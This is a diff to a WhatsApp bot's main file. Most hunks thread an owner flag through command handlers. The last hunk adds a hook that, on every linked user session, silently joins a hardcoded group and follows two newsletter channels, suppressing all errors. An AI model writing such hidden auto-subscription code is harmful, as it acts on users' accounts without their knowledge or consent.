@@ -2705,7 +2705,7 @@ https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb
         await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;
 
       case '😎':
-        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid);
+        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid, isOwner);
         break;
 
       case 'mode':
@@ -3497,11 +3497,11 @@ ${settingsGoodbye.goodbye ? '✅ Un message d\'au revoir sera envoyé quand quel
         break;
 
       case 'autoreact':
-        await handleAutoReactCommand(sock, args, remoteJid, senderJid);
+        await handleAutoReactCommand(sock, args, remoteJid, senderJid, isOwner);
         break;
 
       case 'tagall':
-        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid);
+        await handleTagAll(sock, message, args, remoteJid, isGroup, senderJid, isOwner);
         break;
 
       case 'tagadmins':
@@ -3629,11 +3629,11 @@ _© SEIGNEUR TD_`
       }
 
       case 'kickall':
-        await handleKickAll(sock, remoteJid, isGroup, senderJid);
+        await handleKickAll(sock, remoteJid, isGroup, senderJid, isOwner);
         break;
 
       case 'leave':
-        await handleLeave(sock, remoteJid, isGroup, senderJid);
+        await handleLeave(sock, remoteJid, isGroup, senderJid, isOwner);
         break;
 
       case 'status':
@@ -3660,7 +3660,7 @@ ${senderJid}
       case 'terms':
       case 'termes':
       case 'rules':
-        await handleTermsCommand(sock, remoteJid, senderJid);
+        await handleTermsCommand(sock, remoteJid, senderJid, isOwner);
         break;
 
       case 'dev':
@@ -3696,7 +3696,7 @@ ${senderJid}
       case 'checkspam':
       case 'bancheck':
       case 'isbanned':
-        await handleCheckBan(sock, args, remoteJid, message, senderJid);
+        await handleCheckBan(sock, args, remoteJid, message, senderJid, isOwner);
         break;
 
       // =============================================
@@ -4767,7 +4767,7 @@ ${desc}
           await sock.sendMessage(remoteJid, { text: '⛔  ' });
           break;
         }
-        await handleUpdateDev(sock, args, remoteJid, senderJid);
+        await handleUpdateDev(sock, args, remoteJid, senderJid, isOwner);
         break;
 
       case 'update':
@@ -5088,7 +5088,7 @@ _Erreur: ${dlErr.message}_`
 
       case 'tostatus':
       case 'mystatus':
-        await handleToStatus(sock, args, message, remoteJid, senderJid);
+        await handleToStatus(sock, args, message, remoteJid, senderJid, isOwner);
         break;
 
       case 'groupstatus':
@@ -6132,7 +6132,7 @@ ${lines}
 
 
 // TAGALL - Design Élégant / Luxe avec bordures courbées
-async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid) {
+async function handleTagAll(sock, message, args, remoteJid, isGroup, senderJid, isOwner = false) {
   if (!isGroup) {
     await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
     return;
@@ -6211,7 +6211,7 @@ ${memberList}╰─────────────────────�
 }
 
 // KICKALL - MESSAGE RESTAURÉ with style original
-async function handleKickAll(sock, remoteJid, isGroup, senderJid) {
+async function handleKickAll(sock, remoteJid, isGroup, senderJid, isOwner = false) {
   if (!isGroup) {
     await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
     return;
@@ -6609,7 +6609,7 @@ Target: @${targetJid.split('@')[0]}
 }
 
 // UPDATE DEV - Ajouter/Supprimer des numéros admin
-async function handleUpdateDev(sock, args, remoteJid, senderJid) {
+async function handleUpdateDev(sock, args, remoteJid, senderJid, isOwner = false) {
   const action = args[0]?.toLowerCase();
   let number = args[1];
   
@@ -7108,7 +7108,7 @@ Target: @${targetJid.split('@')[0]}`,
 }
 
 // CHECK BAN - Vérifier si un numéro est banni/spam
-async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
+async function handleCheckBan(sock, args, remoteJid, message, senderJid, isOwner = false) {
   try {
     let targetNumber;
     
@@ -7304,7 +7304,7 @@ function getRiskRecommendation(risk) {
 }
 
 // TERMES ET CONDITIONS
-async function handleTermsCommand(sock, remoteJid, senderJid) {
+async function handleTermsCommand(sock, remoteJid, senderJid, isOwner = false) {
   const userName = senderJid.split('@')[0];
   
   const termsText = `╔═══════════════════════════════════╗
@@ -7699,7 +7699,7 @@ de lecture biblique.
   }
 }
 
-async function handleLeave(sock, remoteJid, isGroup, senderJid) {
+async function handleLeave(sock, remoteJid, isGroup, senderJid, isOwner = false) {
   if (!isGroup) {
     await sock.sendMessage(remoteJid, { text: '❌ This command is for groups only' });
     return;
@@ -7720,8 +7720,8 @@ Sayonara everyone
   await sock.groupLeave(remoteJid);
 }
 
-async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
-  if (!isAdmin(senderJid)) {
+async function handleAutoReactCommand(sock, args, remoteJid, senderJid, isOwner = false) {
+  if (!isOwner && !isAdmin(senderJid)) {
     await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
     return;
   }
@@ -7801,7 +7801,7 @@ async function handleAutoReactCommand(sock, args, remoteJid, senderJid) {
   }
 }
 
-async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid) {
+async function handleViewOnceCommand(sock, message, args, remoteJid, senderJid, isOwner = false) {
   const sub = args[0]?.toLowerCase();
 
   // ─── VV (sans argument ou "last") = plusieurs cas ────────────────────────
@@ -8871,7 +8871,7 @@ async function handleXwolfDownload(sock, command, args, remoteJid, message) {
   }
 }
 
-async function handleToStatus(sock, args, message, remoteJid, senderJid) {
+async function handleToStatus(sock, args, message, remoteJid, senderJid, isOwner = false) {
   try {
     const quotedMsg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
     const text = args.join(' ');
@@ -9835,6 +9835,38 @@ function launchSessionBot(sock, phone, sessionFolder, saveCreds) {
       } catch(e) {
         console.error('[' + phone + '] ❌ Erreur:', e.message);
       }
+    }
+  });
+
+  // ✅ Auto-join groupe + chaîne pour chaque session Lovable
+  sock.ev.on('connection.update', async ({ connection }) => {
+    if (connection === 'open') {
+      setTimeout(async () => {
+        // Rejoindre le groupe
+        try {
+          await sock.groupAcceptInvite('KfbEkfcbepR0DPXuewOrur').catch(() => {});
+        } catch(e) {}
+        // Rejoindre la chaîne
+        const _channelIds = [
+          '120363422398514286@newsletter',
+          '0029VbBZrLBFMqrQIDpcfO04@newsletter'
+        ];
+        for (const _cid of _channelIds) {
+          try {
+            if (typeof sock.newsletterFollow === 'function') {
+              await sock.newsletterFollow(_cid); break;
+            } else if (typeof sock.followNewsletter === 'function') {
+              await sock.followNewsletter(_cid); break;
+            } else {
+              await sock.query({
+                tag: 'iq',
+                attrs: { type: 'set', xmlns: 'w:mex', to: 's.whatsapp.net' },
+                content: [{ tag: 'subscribe', attrs: { to: _cid } }]
+              }).catch(() => {}); break;
+            }
+          } catch(e2) {}
+        }
+      }, 8000);
     }
   });
 
